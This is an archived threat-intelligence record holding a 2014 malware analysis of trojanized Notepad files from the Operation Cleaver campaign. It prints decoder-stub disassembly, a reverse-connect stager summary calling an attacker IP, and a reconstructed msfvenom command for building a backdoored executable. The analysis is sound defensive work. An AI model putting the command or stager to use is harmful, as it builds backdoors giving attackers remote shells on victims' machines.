{
    "id": "4893e19b-7e1b-4ee1-a85e-55fd30aef566",
    "created_at": "2022-10-25T16:48:15.500809Z",
    "updated_at": "2025-03-27T02:14:34.170251Z",
    "deleted_at": null,
    "sha1_hash": "741f2f131cf70bb62cd9ba3a4a298b12a5a74877",
    "title": "",
    "authors": "",
    "file_creation_date": "2020-12-23T07:06:02Z",
    "file_modification_date": "2020-12-23T07:06:02Z",
    "file_size": 428746,
    "plain_text": "# Operation Cleaver: The Notepad Files\n\n**[blogs.blackberry.com/en/2014/12/operation-cleaver-the-notepad-files](https://blogs.blackberry.com/en/2014/12/operation-cleaver-the-notepad-files)**\n\nYou see some strange stuff out there on the networks where attackers are active. Certainly\nthe stash of files unearthed during the Operation Cleaver investigation included much of\nthe bizarre and something of the terrible.\n\nBrian Wallace, who led the investigation, shared a mysterious set of samples with me\nawhile back, and now that Operation Cleaver is public, I'll relate the lurid technical\ndetails.\n\n## The Notepad Files\n\nThe files in question were found in a dim and dusty directory on a forlorn FTP server in\nthe US, commingled with the detritus of past attack campaigns and successful\ncompromises. They were at once familiar and strange, and they were made still stranger\nand more perplexing by their location and the circumstances of their discovery. All\naround them was a clutter of credential dumps, hacking utilities, RATs, and even\nlegitimate software installers, but the files in question were none of these. They were\nNotepad.\n\n\n-----\n\n## Figure 1. The Notepad DoppelgÃ¤ngers.\n\nOf course, a purloined Notepad icon in malware is nothing new, but something different\nwas going on here. Within each of the two families, all of the samples had the same main\nicon, file size, and version information, yet each one had a distinct hash. At the time, only\none of those five hashes existed on the internet: the official 32-bit Simplified Chinese\nNotepad from Windows XP x64 / Windows Server 2003. Suspecting that the remaining\nNotepads were derivatives of official Windows files, we associated the other member of\nthe first family with the confirmed legitimate Notepad, and we matched the second family\nwith the 32-bit US English Notepad from Windows 7 (not present in the original set).\n\n|MD5|File Name|File Size|File Version|\n|---|---|---|---|\n|83868cdff62829fe3b897e2720204679|notepad.exe|66,048|5.2.3790.3959, Chinese (Simplified, PRC)|\n|bfc59f1f442686af73704eff6c0226f0|NOTEPAD2.EXE|179,712|6.1.7600.16385, English (United States)|\n\n\n-----\n\ne8ea10d5cde2e8661e9512fb684c4c98 Notepad3.exe 179,712 6.1.7600.16385,\nEnglish (United\nStates)\n\nbaa76a571329cdc4d7e98c398d80450c Notepad4.exe 66,048 5.2.3790.3959,\nChinese\n(Simplified,\nPRC)\n\n19d9b37d3acf3468887a4d41bf70e9aa notepad10.exe 179,712 6.1.7600.16385,\nEnglish (United\nStates\n\nd378bffb70923139d6a4f546864aa61c -- 179,712 6.1.7600.16385,\nEnglish (United\nStates)\n\n**_Table 1. A summary of Notepad samples dug from the attackers' FTP drop, with the_**\n_official Windows 7 Notepad appearing at bottom. It and the official Windows XP/2003_\n_Notepad are represented in green._\n\nThings got interesting when we started comparing the Notepads at the byte level. The\nimage below depicts some byte differences between the original Windows 7 Notepad and\nsamples NOTEPAD2.EXE and Notepad3.exe:\n\n|baa76a571329cdc4d7e98c398d80450c|Notepad4.exe|66,048|5.2.3790.3959, Chinese (Simplified, PRC)|\n|---|---|---|---|\n|19d9b37d3acf3468887a4d41bf70e9aa|notepad10.exe|179,712|6.1.7600.16385, English (United States|\n|d378bffb70923139d6a4f546864aa61c|--|179,712|6.1.7600.16385, English (United States)|\n\n\n-----\n\n**_Figure 2. Comparison of the Windows 7 Notepad (green channel), NOTEPAD2.EXE_**\n_(red channel), and Notepad3.exe (blue channel)._\n\nAt the Portable Executable (PE) level, these differences translate to changes in the files'\ntimestamps (IMAGE_NT_HEADERS.FileHeader.TimeDateStamp, offset 0xE8 in the\nfigure above), the relative virtual addresses (RVAs) of their entry points\n(IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint, offset 0x108), and their\nchecksums (IMAGE_NT_HEADERS.OptionalHeader.CheckSum, offset 0x138). The\n\n\n-----\n\ntimestamps were rolled back by weeks to months relative to the legitimate progenitors\ntimestamps; we don't know why. The entry points retreated or advanced by hundreds of\nbytes to dozens of kilobytes, for reasons we'll explore shortly. And the checksums were all\nzeroed out, presumably because the file modifications invalidate them, invalid non-zero\nchecksums are a tip-off, and zeroing is easier than recomputing.\n\nSo what's the story with all those other modifications? In all cases they seem to be\nconfined to the \".text\" section, centrally located to avoid the import directory, debug\ndirectory, load configuration directory, and import address table. This makes sense as a\ngeneral precaution, considering that corrupting the import directory would unhelpfully\ncrash the Windows loader during process initialization. The following image illustrates\nthe distribution of modifications relative to these structures.\n\n\n-----\n\n**_Figure 3. File locations of modifications (red) and the PE structures they avoid (gray)._**\n_From left to right, the four vertical bars represent the \".text\" sections of_\n_NOTEPAD2.EXE, Notepad3.exe, Notepad4.exe, and notepad10.exe, as compared to the_\n_original Notepad from their respective families. The Import Address Table (IAT),_\n_original entry point (OEP, green), malware entry point (EP, yellow), load configuration_\n_directory (LC), import directory (Imp), and debug directory (Dbg) are labeled._\n\nWhile the arrangement of the structures varies among families, it's clear from the figure\nabove that the region between structures containing the original entry point has in each\ncase been filled with modifications. Notably, each sample has a short run of consecutive\nmodifications immediately following the new entry point, and then a longer run elsewhere\nin the region. Presumably, both runs are injected malicious code, and the other\nmodifications may well be random noise intended as a distraction. Since there are no\nother changes and no appended data, it's reasonable to assume that the code that makes a\nNotepad act like Notepad is simply gone, and that the samples will behave only\nmaliciously. If true, then these modifications would represent a backdooring or\n\"Trojanization\" rather than a parasitic infection, and this distinction implies certain\nthings about how the Notepads were made and how they might be used.\n\n**Tales from the Code**\n\nLet's take a look at the entry point code of the malicious Notepads and see if it aligns with\nour observations. The short answer is, it looks like nonsense. Here's a snippet from\nNotepad4.exe:\n```\n 010067E3    sbb   eax, 2C7AE239\n 010067E8    test  al, 80\n 010067EA    test  eax, 498DBAD5\n 010067F0    jle   short 01006831\n 010067F2    sub   eax, B69F4A73\n 010067F7    or   edx, esi\n 010067F9    jnz   short 01006800\n 010067FB    inc   ebx\n 010067FC    mov   cl, 91\n 010067FE    cwde\n 010067FF    jnp   short 01006803\n\n```\nAt this point the code becomes difficult to list due to instruction scission, or branching\ninto the middle of an instruction (analogous to a frameshift error in DNA translation, if\nthat helps). For instance, the JNP instruction at 010067FF is a two-byte instruction, and\nthe JNZ branch at 010067F9, if satisfied, jumps to the JNP instruction's second byte at\n01006800. That byte begins a different two-byte instruction, which incorporates what\n\n\n-----\n\nwould have otherwise been the first byte of the instruction after the JNP, meaning its\nsuccessor will start in the middle of JNP's successor, and so on. The two execution paths\nusually (but don't necessarily) converge after a few instructions.\n\nThe outcome of these instructions depends on the initial state of the registers, which is\ntechnically undefined. Seeing code operate on undefined values typically suggests that the\nbytes aren't code after all and so shouldn't have been disassembled. But keep looking.\nNotice that there are no memory accesses (which could raise an access violation), no stack\npointer manipulation (which could cause a stack overflow or underflow), no division\ninstructions (which could raise a divide exception), no invalid or privileged instructions,\nno interrupts or indirect branches--really, no uncontrolled execution transfers of any\nkind. Even more tellingly, all the possible execution paths seem to eventually flow to this\ncode:\n```\n 01006877    mov   ch, 15\n 01006879    cmp   eax, 4941B62F\n 0100687E    xchg  eax, ebx\n 0100687F    mov   cl, 4B\n 01006881    stc\n 01006882    wait\n 01006883    xchg  eax, ecx\n 01006884    inc   ebx\n 01006885    cld\n 01006886    db 67\n 01006887    aaa\n 01006888    cwde\n 01006889    sub   eax, 24401D66\n 0100688E    dec   eax\n 0100688F    add   al, F8\n 01006891    jmp   01005747\n 01005747    nop\n 01005748    jmp   01005758\n 01005758    cld\n 01005759 nop\n\n```\n\n-----\n\n```\n 0100575A    jmp   short 01005768\n 01005768    call  01005A70\n 01005A70    nop\n 01005A71    pop  ebp\n 01005A72    jmp   01005A85\n 01005A85    nop\n 01005A86    mov   esi, 000001A9\n 01005A8B    jmp   01005A99\n 01005A99    push  00000040\n 01005A9B    push  00001000\n 01005AA0    nop\n 01005AA1    jmp   01005AAF\n 01005AAF    push  esi\n 01005AB0    nop\n 01005AB1    jmp   01005AC2\n 01005AC2    push  0\n 01005AC4    push  E553A458\n 01005AC9    jmp   01005AD7\n 01005AD7    call  ebp\n\n```\nHere the gaps in the listing indicate when the disassembly follows an unconditional\nbranch. The code seems to abruptly change character after the jump at 01006891,\ntransitioning from gibberish to a string of short sequences connected by unconditional\nbranches. This transition corresponds to a jump from the end of the short run of\n\n\n-----\n\nmodifications (01006896) after the malware entry point to the beginning of the longer\nrun of modifications (01005747) a few kilobytes before it. (See the third column in Figure\n3.)\n\nIn the disassembly above, the first sequence of green lines is a clear CALL-POP pair\nintended to obtain a code address in a position-independent way. (An immediate address\nvalue marked with a relocation would be the orthodox way to obtain a code pointer, but\npreparing that would have involved modifying the \".reloc\" section.) No way is this\nconstruct a coincidence. Furthermore, the blue lines strongly resemble the setup for a\nVirtualAlloc call (VirtualAlloc(NULL, 0x1A9, MEM_COMMIT,\nPAGE_EXECUTE_READWRITE)) typical of a deobfuscation stub, and the second set of\ngreen lines invoke the CALL-POPped function pointer with what one might readily\nassume is a hash of the string \"VirtualAlloc\". (It is.)\n\nThere's plenty more to observe in the disassembly, but, let's fast-forward past it.\n\nwindbg -c \"bp kernel32!VirtualAlloc ; g\" Notepad4.exe...\n\n**_Figure 4. VirtualAlloc breakpoint hit. The parameters on the stack and the state of the_**\n_registers are as expected._\n```\n g poi(@esp) ; ba w 1 @eax+@esi-1 ; g...\n\n```\n**_Figure 5. Memory write (hardware) breakpoint hit after the last (0x1A9th) byte is_**\n_written to allocated memory._\n\nAnd now we can dump the extracted code from memory. It isn't immediately gratifying:\n```\n 00100000    fabs\n 00100002    mov   edx, 4DF05534 ; = initial XOR key\n 00100007    fnstenv [esp-0C]    ; old trick to get EIP\n 0010000B    pop   eax\n 0010000C    sub   ecx, ecx\n\n```\n\n-----\n\n```\n 0010000E    mov   cl, 64     ; length in DWORDs\n 00100010    xor   [eax+19], edx\n 00100013    add   edx, [eax+19] ; XOR key is modified after each DWORD\n 00100016    add   eax, 4\n 00100019    db D6\n\n```\nThe byte 0xD6 at address 00100019 doesn't disassemble, and there aren't any branches\nskipping over it. But check out the instructions just above it referencing \"[eax+19]\". The\ncode is in a sense self-modifying, flowing right into a portion of itself that it XOR decodes.\nThe first decoded instruction is \"LOOP 00100010\" (0xD6 ^ 0x34 = 0xE2, the opcode for\nLOOP), which will execute the XOR loop body 99 more times (CL - 1 = 0x63 = 99) and\nthen fall through to the newly-decoded code.\n\nWhen we run this decoding stub (which, come to find out, is Metasploit's \"shikata ga nai\"\ndecoder stub) to completion, we're rewarded with... another decoding stub:\n```\n 0010001B    fcmovu st, st(1) ; a different initial FPU instruction from\nabove\n 0010001D    fnstenv [esp-0C]  ; different ordering of independent\ninstructions\n 00100021    mov   ebx, C2208861 ; a different initial XOR key and register\n 00100026    pop   ebp    ; a different code pointer register\n 00100027    xor   ecx, ecx  ; XOR as an alternative to SUB for zeroing\ncounter\n 00100029    mov   cl, 5D   ; a shorter length\n 0010002B    xor   [ebp+1A], ebx ; decoding starts at a different offset\n 0010002E    add   ebx, [ebp+1A]\n 00100031    sub   ebp, FFFFFFFC ; SUB -4 as an alternative to ADD +4\n 00100034    loop  000FFFCA  ; instruction is partly encoded\n\n```\nHere, the first byte to be XORed is the second byte of the LOOP instruction, hence the\nnonsensical destination apparent in the pre-decoding disassembly above. (For brevity, we\ncut each listing at the first sign of encoding.) Run that to completion, and then...\n```\n 00100036    mov   edx, 463DC74D\n 0010003B    fcmovnbe st, st(0)\n 0010003D    fnstenv [esp-0C]\n 00100041    pop   eax\n 00100042    sub   ecx, ecx\n\n```\n\n-----\n\n```\n 00100044    mov   cl, 57 ; notice the length gets shorter each time\n 00100046    xor   [eax+12], edx\n 00100049    add   eax, 4\n 0010004C    add   ebx, ds:[47B3DFC9] ; instruction is partly encoded\n\n```\nAnd then...\n```\n 00100051    fcmovbe st, st(0)\n 00100053    mov   edx, 869A5D73\n 00100058    fnstenv [esp-0C]\n 0010005c    pop   eax\n 0010005d    sub   ecx, ecx\n 0010005f    mov   cl, 50\n 00100061    xor   [eax+18],edx\n 00100064    add   eax, 4\n 00100067    add   edx, [eax+67] ; instruction is partly encoded\n\n```\nAnd then...\n```\n 0010006C    mov   eax, E878CF4D\n 00100071    fcmovnbe st, st(4)\n 00100073    fnstenv [esp-0C]\n 00100077    pop   ebx\n 00100078    sub   ecx, ecx\n 0010007A    mov   cl, 49\n 0010007C    xor   [ebx+14], eax\n 0010007F    add   ebx, 4\n 00100082    add   eax, [ebx+10]\n 00100085    scasd ; incorrect disassembly of encoded byte\n\n```\nFinally, at the end of six nested decoders, we see the light:\n```\n 00100087    cld\n 00100088    call  00100116\n 0010008D    pushad\n 0010008E    mov   ebp, esp\n\n```\n\n-----\n\n```\n 00100090    xor   edx, edx\n 00100092    mov   edx, fs:[edx+30] ; PTEB->ProcessEnvironmentBlock\n 00100096    mov   edx, [edx+0C]   ; PPEB->Ldr\n 00100099    mov   edx, [edx+14]   ; PPEB_LDR_DATA>InMemoryOrderModuleList\n 0010009C    mov   esi, [edx+28]   ; PLDR_MODULE.BaseDllName.Buffer\n 0010009F    movzx  ecx, word ptr [edx+26] ;\nPLDR_MODULE.BaseDllName.MaximumLength\n 001000A3    xor   edi, edi\n 001000A5    xor   eax, eax\n 001000A7    lodsb\n 001000A8    cmp   al, 61 ; check for lowercase letter\n 001000AA    jl   001000ae\n 001000AC    sub   al, 20 ; convert to uppercase\n 001000AE    ror   edi, 0D\n 001000B1    add   edi, eax\n ...\n\n```\nIt looks like a call over a typical module or export lookup function. In fact, it is, and as the\nROR-ADD pair suggests, it implements module name and export name hashing, the\nalgorithms of which can be expressed as follows:\n```\n unsigned int GetModuleNameHash(PLDR_MODULE pLdrModule)\n {\n   unsigned int hash = 0;\n   char * p = (char *) pLdrModule->BaseDllName->Buffer;\n   for (int n = pLdrModule->BaseDllName->MaximumLength; n != 0; p++, n--)\n   {\n     char ch = *p;\n     if (ch >= 'a') ch -= 0x20;\n     hash = _rotr(hash, 13) + (unsigned char) ch;\n   }\n   return hash;\n }\n\n```\n\n-----\n\n```\n unsigned int GetExportNameHash(char *pszName)\n {\n   unsigned int hash = 0;\n   for ( ; ; pszName++)\n   {\n     hash = _rotr(hash, 13) + (unsigned char) *pszName;\n     if (*pszName == 0) break;\n   }\n   return hash;\n }\n\n```\nStill, this is all just preamble. What is the point that it eventually gets to?\n\nYou'd be forgiven for assuming that the tremendous amount of effort poured into\nobfuscation means there's some treasure beyond all fables at the bottom of this erstwhile\nNotepad. Sorry. It just downloads and executes a block of raw code. (Spoiler: it's actually a\nMetasploit reverse connect stager.) Here is its behavior summarized as function calls:\n```\n kernel32!LoadLibraryA(\"ws2_32\")\n ws2_32!WSAStartup(...)\n s = ws2_32!WSASocketA(AF_INET, SOCK_STREAM, ...)\n ws2_32!connect(s, { sin_family = AF_INET, sin_port = htons(12345), sin_addr =\n108.175.152.230 }, 0x10)\n ws2_32!recv(s, &cb, 4, 0)\n p = kernel32!VirtualAlloc(NULL, cb, MEM_COMMIT, PAGE_EXECUTE_READWRITE)\n ws2_32!recv(s, p, cb, 0)\n p()\n\n```\nThe above is known to be true for Notepad3.exe, Notepad4.exe, and notepad10.exe.\nNOTEPAD2.EXE doesn't seem to want to run, for reasons we didn't bother to\ntroubleshoot for the bad guys.\n\n**Denouement**\n\nUnfortunately, we never did obtain a sample of the code that might have been\ndownloaded. The key to that enigma-embedded, mystery-wrapped riddle is forever lost to\nus. The best we can do is read what's written in the Notepads and speculate as to why they\nexist at all.\n\n\n-----\n\nClearly whatever generator created these Notepads is far, far beyond the technical\nunderstanding of the Cleaver team. It stands to reason that there is a generator--no\nchance these were crafted by hand--and that its sophistication is even greater than that of\nits output. Something like that wouldn't be used only once. Something like that, if this\nteam was able to get ahold of it, must be out there. Turn the right corner of the internet,\nand you can find anything...\n\nWell it so happens that we did eventually find it. Some of you have no doubt suspected it\nall along, and now I'll humbly confirm it for you: the Notepads were, in their entirety,\ngenerated by Metasploit. Something along the lines of \"msfvenom -x notepad.exe -p\nwindows/shell/reverse_tcp -e x86/shikata_ga_nai -i 5 LHOST=108.175.152.230\nLPORT=12345 > Notepad4.exe\". The \"msfvenom\" tool transmogrifies a Metasploit\npayload into a standalone EXE, and with the \"-x\" switch, it'll fuse the payload--encoded as\ndesired--into a copy of an existing executable, exhibiting exactly the behavior we just\ndescribed. Omne ignotum pro magnifico. Perhaps the more bizarre a thing is, the less\nmysterious it proves to be.\n\nHowever, we're still left to wonder what Cleaver was up to when they generated all those\nNotepads. One conclusion Brian proposed is that they're intended as backdoors-replacements for the legitimate Notepad on a compromised system--which would enable\nCleaver to regain access to a system at some indeterminate time in the future, the next\ntime a user runs Notepad. The team demonstrated a similarly intentioned tactic with a\nconnect-back shell scheduled to run in a six-minute window each night; the Notepad\nreplacement, while more intrusive, could be another example of this contingency\nplanning tendency.\n\nOr maybe the Notepads were only an aborted experiment, attempted and shelved,\nforgotten in a flurry of compromises and criminal activity. If nothing else, they made for\nan unexpected bit of mystery.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2014/2014.12.05.Operation_Cleaver/blogs.blackberry.com-Operation%20Cleaver%20The%20Notepad%20Files.pdf"
    ],
    "report_names": [
        "blogs.blackberry.com-Operation Cleaver The Notepad Files"
    ],
    "threat_actors": [
        {
            "id": "49f1ada0-181f-4e89-a449-e6bc13c8c6b1",
            "created_at": "2022-10-25T15:50:23.561511Z",
            "updated_at": "2025-03-27T02:00:55.499988Z",
            "deleted_at": null,
            "main_name": "Cleaver",
            "aliases": [
                "Threat Group 2889",
                "TG-2889"
            ],
            "source_name": "MITRE:Cleaver",
            "tools": [
                "Net Crawler",
                "PsExec",
                "TinyZBot",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "7c8cf02c-623a-4793-918b-f908675a1aef",
            "created_at": "2023-01-06T13:46:38.309165Z",
            "updated_at": "2025-03-27T02:00:02.801298Z",
            "deleted_at": null,
            "main_name": "APT15",
            "aliases": [
                "BRONZE PALACE",
                "Nylon Typhoon",
                "VIXEN PANDA",
                "Playful Dragon",
                "BRONZE DAVENPORT",
                "BRONZE IDLEWOOD",
                "G0004",
                "Red Vulture",
                "Ke3Chang",
                "Metushy",
                "Lurid",
                "Social Network Team",
                "Royal APT"
            ],
            "source_name": "MISPGALAXY:APT15",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "217c588a-5896-4335-b9ec-a516ae2f9a7e",
            "created_at": "2022-10-25T16:07:23.513775Z",
            "updated_at": "2025-03-27T02:02:09.838687Z",
            "deleted_at": null,
            "main_name": "Cutting Kitten",
            "aliases": [
                "Cutting Kitten",
                "Operation Cleaver",
                "TG-2889"
            ],
            "source_name": "ETDA:Cutting Kitten",
            "tools": [
                "CsExt",
                "DistTrack",
                "IvizTech",
                "Jasus",
                "KAgent",
                "Logger Module",
                "MANGOPUNCH",
                "MPK",
                "MPKBot",
                "Net Crawler",
                "NetC",
                "PVZ-In",
                "PVZ-Out",
                "Pupy",
                "PupyRAT",
                "PvzOut",
                "Shamoon",
                "SynFlooder",
                "SysKit",
                "TinyZBot",
                "WndTest",
                "pupy",
                "zhCat",
                "zhMimikatz"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "3fff98c9-ad02-401d-9d4b-f78b5b634f31",
            "created_at": "2023-01-06T13:46:38.376868Z",
            "updated_at": "2025-03-27T02:00:02.818071Z",
            "deleted_at": null,
            "main_name": "Cleaver",
            "aliases": [
                "Cobalt Gypsy",
                "G0003",
                "Operation Cleaver",
                "Op Cleaver",
                "Tarh Andishan",
                "Alibaba",
                "TG-2889"
            ],
            "source_name": "MISPGALAXY:Cleaver",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1666716495,
    "ts_updated_at": 1743041674,
    "ts_creation_date": 1608707162,
    "ts_modification_date": 1608707162,
    "files": {
        "pdf": "https://archive.orkl.eu/741f2f131cf70bb62cd9ba3a4a298b12a5a74877.pdf",
        "text": "https://archive.orkl.eu/741f2f131cf70bb62cd9ba3a4a298b12a5a74877.txt",
        "img": "https://archive.orkl.eu/741f2f131cf70bb62cd9ba3a4a298b12a5a74877.jpg"
    }
}